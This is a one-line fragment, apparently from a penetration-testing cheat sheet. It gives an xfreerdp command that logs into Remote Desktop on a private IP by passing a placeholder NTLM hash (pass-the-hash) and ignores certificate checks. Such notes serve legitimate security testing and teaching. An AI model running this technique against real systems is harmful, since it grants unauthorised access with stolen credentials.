xfreerdp /v:10.10.10.10 /u:<user> /pth:<hash> /cert:ignore
```
